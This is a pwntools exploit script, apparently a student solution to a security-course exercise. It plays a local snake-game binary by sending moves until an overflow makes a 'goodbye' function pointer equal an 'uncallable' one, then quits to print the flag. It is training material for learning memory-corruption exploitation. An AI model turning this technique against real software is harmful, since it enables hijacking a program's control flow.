#!/usr/bin/env python
# -*- coding: utf-8 -*-
# This exploit template was generated via:
# $ pwn template
from pwn import *

# Set up pwntools for the correct architecture
context.update(arch='amd64')
exe = '/home/student/handout/exercise6/exercise6a'

# Many built-in settings can be controlled on the command-line and show up
# in "args".  For example, to dump all data sent/received, and disable ASLR
# for all created processes...
# ./exploit.py DEBUG NOASLR


def start(argv=[], *a, **kw):
    '''Start the exploit against the target.'''
    if args.GDB:
        return gdb.debug([exe] + argv, gdbscript=gdbscript, *a, **kw)
    else:
        return process([exe] + argv, *a, **kw)

# Specify your GDB script here for debugging
# GDB will be launched if the exploit is run via e.g.
# ./exploit.py GDB
gdbscript = '''
c
'''.format(**locals())

#===========================================================
#                    EXPLOIT GOES HERE
#===========================================================

r = start()

len_80 = False
solved = False

while(True):
    gb = r.recvline()   #goodbye
    gb_addr = int(gb[gb.index(b'x')+1:-1], 16)
    # print(f"goodbye_addr: {hex(gb_addr)}")

    uc = r.recvline()   #uncallable
    uc_addr = int(uc[uc.index(b'x')+1:-1], 16)
    # print(f"uncallable_addr: {hex(uc_addr)}")

    if gb_addr == uc_addr:
        solved=True

    # grid
    for _ in range(20):
        r.recvline()
        # print(r.recvline())
    
    # print(r.recvline()) #fruit
    # print(r.recvline()) #snake

    r.recvline()        #fruit
    r.recvline()        #snake
    
    sl = r.recvline()   #snake length
    sl = int(sl[sl.index(b':')+2:-1])
    # print(f"Sanke length: {sl}")

    if sl >= 81:
        print(f"goodbye_addr: {hex(gb_addr)}")
        print(f"uncallable_addr: {hex(uc_addr)}")
        
        len_80 = True

    # print(r.recvline()) #enter command
    r.recvline()          #enter command

    if solved:
        r.sendline(b"q")
        print(r.recvline()) # FLAG
        exit()
    elif not len_80:
        r.sendline(b"A")
    elif len_80:
        r.sendline(b"d")
    # exit()